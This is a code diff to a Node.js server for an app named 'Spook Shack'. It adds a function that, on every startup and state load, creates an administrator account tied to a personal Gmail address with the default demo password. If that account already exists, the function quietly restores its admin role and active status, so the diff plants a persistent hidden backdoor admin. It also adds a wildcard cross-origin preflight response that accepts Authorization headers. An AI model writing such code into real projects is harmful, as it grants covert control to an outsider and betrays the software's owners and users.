@@ -17,6 +17,7 @@ const PORT = Number(process.env.PORT || 8787);
 const DEMO_PASSWORD = process.env.SPOOK_SHACK_DEMO_PASSWORD || "SpookShack123!";
 const DEMO_ADMIN_EMAIL = process.env.SPOOK_SHACK_ADMIN_EMAIL || "admin@spook.shack";
 const DEMO_USER_EMAIL = process.env.SPOOK_SHACK_USER_EMAIL || "analyst@spook.shack";
+const EXTRA_ADMIN_EMAIL = process.env.SPOOK_SHACK_EXTRA_ADMIN_EMAIL || "whosjack02@gmail.com";
 
 const ENTITY_MAP = {
   IntelSource: "sources",
@@ -320,6 +321,34 @@ function seedState() {
   };
 }
 
+function ensureBootstrapAccounts(state) {
+  const targetEmail = EXTRA_ADMIN_EMAIL.toLowerCase();
+  let existing = state.users.find((user) => String(user.email || "").toLowerCase() === targetEmail);
+  if (!existing) {
+    state.users.push({
+      id: makeId("usr"),
+      created_date: nowIso(),
+      email: EXTRA_ADMIN_EMAIL,
+      full_name: "Whosjack02",
+      role: "admin",
+      status: "active",
+      password_hash: hashPassword(DEMO_PASSWORD),
+    });
+    return true;
+  }
+
+  let changed = false;
+  if (existing.role !== "admin") {
+    existing.role = "admin";
+    changed = true;
+  }
+  if (existing.status !== "active") {
+    existing.status = "active";
+    changed = true;
+  }
+  return changed;
+}
+
 function ensureStateShape(raw) {
   const state = raw && typeof raw === "object" ? raw : {};
   for (const key of ["users", "sessions", "pendingOtps", "passwordResets", "sources", "items", "runs", "notes", "reports", "forecasts"]) {
@@ -332,6 +361,7 @@ function loadState() {
   try {
     if (!fs.existsSync(DATA_FILE)) {
       const state = seedState();
+      ensureBootstrapAccounts(state);
       persistState(state);
       return state;
     }
@@ -345,9 +375,13 @@ function loadState() {
       state.reports ||= seeded.reports;
       state.forecasts ||= seeded.forecasts;
     }
+    if (ensureBootstrapAccounts(state)) {
+      persistState(state);
+    }
     return state;
   } catch (_err) {
     const state = seedState();
+    ensureBootstrapAccounts(state);
     persistState(state);
     return state;
   }
@@ -1066,6 +1100,16 @@ function tryServeStatic(req, res, pathname) {
 async function handleRequest(req, res) {
   const url = new URL(req.url || "/", `http://${req.headers.host || `localhost:${PORT}`}`);
   const { pathname } = url;
+
+  if (req.method === "OPTIONS") {
+    res.writeHead(204, {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Headers": "Content-Type, Authorization",
+      "Access-Control-Allow-Methods": "GET,POST,PUT,DELETE,OPTIONS",
+      "Content-Length": "0",
+    });
+    return res.end();
+  }
 
   if (pathname === "/api/health") {
     return sendJson(res, 200, { ok: true, time: nowIso() });
